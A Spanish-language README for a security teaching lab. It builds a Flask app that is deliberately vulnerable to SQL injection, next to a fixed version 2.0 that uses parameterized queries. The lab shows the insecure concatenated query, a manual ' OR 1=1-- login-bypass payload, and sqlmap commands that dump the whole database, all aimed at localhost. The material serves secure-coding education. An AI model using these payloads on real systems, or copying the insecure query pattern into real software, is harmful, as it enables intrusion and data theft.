# Lab: Aplicación Web Vulnerable a SQL Injection y Versión 2.0 Segura

## 1. Descripción General

Este laboratorio consiste en el desarrollo de:

1. Una aplicación web vulnerable a SQL Injection.
2. Una versión 2.0 donde la vulnerabilidad es mitigada mediante buenas prácticas de desarrollo seguro.
3. Contenerización utilizando Docker Compose.
4. Explotación de la versión vulnerable con sqlmap para realizar un dump completo de la base de datos.

Ambas aplicaciones utilizan:

* Python (Flask)
* Microsoft SQL Server
* Docker y Docker Compose

---

# PARTE I — Aplicación Vulnerable

## 2. Arquitectura

Usuario → Aplicación Flask → SQL Server

La aplicación vulnerable construye consultas SQL concatenando directamente los parámetros enviados por el usuario.

Ejemplo conceptual inseguro:

```
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

Esta práctica permite la inyección de código SQL.

---

## 3. Inicialización de la Base de Datos (init.sql)

El archivo `init.sql` contiene:

* Creación de la base de datos
* Creación de la tabla `users`
* Inserción de datos iniciales

En esta versión se utiliza un servicio adicional `db-init` en el `docker-compose.yml` que:

1. Espera a que SQL Server esté disponible.
2. Ejecuta el script `init.sql` mediante `sqlcmd`.

Si se desea reinicializar completamente la base:

```
docker compose down -v
```

El parámetro `-v` elimina los volúmenes y fuerza la recreación de la base de datos.

---

## 4. Cómo levantar la aplicación vulnerable

Desde la raíz del proyecto:

```
docker compose up --build
```

Esto realiza:

1. Construcción de la imagen de la aplicación Flask.
2. Levantamiento del contenedor SQL Server (`db`).
3. Ejecución del script `init.sql` mediante `db-init`.
4. Conexión de la aplicación con la base de datos.

La aplicación quedará disponible en:

```
http://localhost:5001
```

---

## 5. Pruebas manuales

### Login válido

```
http://localhost:5001/login?username=admin&password=admin123
```

### SQL Injection manual

```
http://localhost:5001/login?username=' OR 1=1--&password=anything
```

Resultado esperado: bypass del login.

---

## 6. Explotación con sqlmap

Ejemplo:

```
sqlmap -u "http://localhost:5001/login?username=admin&password=admin123" --dump --batch
```

Comandos adicionales:

Obtener bases de datos:

```
sqlmap -u "URL_OBJETIVO" --dbs
```

Obtener tablas:

```
sqlmap -u "URL_OBJETIVO" -D NOMBRE_DB --tables
```

Dump completo:

```
sqlmap -u "URL_OBJETIVO" --dump
```

Resultado esperado: extracción completa del contenido de la base de datos.

---

# PARTE II — Versión 2.0 Aplicación Segura

## 7. Mejoras Implementadas

La versión segura corrige la vulnerabilidad mediante:

1. Validación y sanitización de parámetros mediante expresión regular.
2. Uso de consultas parametrizadas con placeholders (`?`).

Ejemplo conceptual seguro:

```
cursor.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password)
)
```

Además, la aplicación escucha en `0.0.0.0` dentro del contenedor para permitir acceso externo.

---

## 8. Cómo levantar la versión segura

Ubicarse en la carpeta correspondiente:

```
cd lab_secure_app_py
docker compose up --build
```

Esto:

1. Construye la imagen de la versión segura.
2. Levanta un contenedor SQL Server independiente.
3. Ejecuta el script `init.sql` mediante `db-init`.
4. Conecta la aplicación segura a la base de datos.

La aplicación estará disponible en:

```
http://localhost:5002
```

Nota técnica:

Ambas aplicaciones escuchan internamente en el puerto 5001, pero se exponen en diferentes puertos del host para evitar conflictos:

* Vulnerable → 5001
* Segura → 5002

---

## 9. Pruebas en la versión segura

### Login válido

```
http://localhost:5002/login?username=admin&password=admin123
```

### Intento de SQL Injection

```
http://localhost:5002/login?username=' OR 1=1--&password=anything
```

Resultado esperado:

* El login falla.
* No se produce bypass.
* sqlmap no logra extraer información.

---

# 10. Reinicio completo del entorno

Si se desea reinicializar completamente cualquiera de las aplicaciones:

Desde la carpeta correspondiente ejecutar:

```
docker compose down -v
docker compose up --build
```

---

# 11. Comparación Técnica

| Característica        | Vulnerable            | Versión 2.0   |
| --------------------- | --------------------- | ------------- |
| Construcción SQL      | Concatenación directa | Parametrizada |
| Validación de entrada | No                    | Sí            |
| Vulnerable a SQLi     | Sí                    | No            |
| Explotable con sqlmap | Sí                    | No            |

---

# 12. Conclusiones

Este laboratorio demuestra:

* Cómo una mala práctica en la construcción de consultas SQL compromete completamente una base de datos.
* Cómo herramientas automatizadas pueden explotar vulnerabilidades reales con facilidad.
* Cómo la parametrización de consultas elimina una vulnerabilidad crítica sin necesidad de cambios complejos en la arquitectura.

La comparación entre ambas versiones evidencia el impacto directo de aplicar buenas prácticas de desarrollo seguro.
